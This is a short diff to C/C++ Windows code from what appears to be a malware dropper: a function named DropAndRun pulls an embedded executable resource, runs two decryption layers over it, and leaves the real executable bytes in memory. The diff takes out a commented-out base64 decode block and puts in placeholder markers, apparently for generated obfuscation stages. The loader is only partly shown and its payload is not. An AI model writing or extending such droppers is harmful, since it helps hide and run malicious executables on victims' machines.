@@ -41,6 +41,8 @@ bool GetResourceBuffer(HMODULE hModule, int resId, BYTE** ppOut, DWORD* pOutSize
     return true;
 }
 
+//base641
+
 //decodescript1
 
 //decodescript2
@@ -75,17 +77,11 @@ void DropAndRun(HMODULE hModule) {
     if (!GetResourceBuffer(hModule, IDR_EXE1, &decodedData, &decodedSize)) {
         return;
     }
-    //base64 decode stuff
-        // DWORD decodedSize = 0;
-        // BYTE* decodedData = DecodeBase64Resource(decodedData, decodedSize, &decodedSize);
-        // free(decodedData);
-        // decodedData = NULL;
-        // if (!decodedData || decodedSize == 0) {
-        //     if (decodedData) { SecureZeroMemory(decodedData, decodedSize); free(decodedData); }
-        //     wprintf(L"Base64 decode failed\n");
-        //     return;
-        // }
 
+
+    //base642
+
+    
     decrypt2(decodedData, decodedSize, KEY2);
     decrypt1(decodedData, decodedSize, KEY1);
     // After this call, decodedData contains the actual executable bytes.
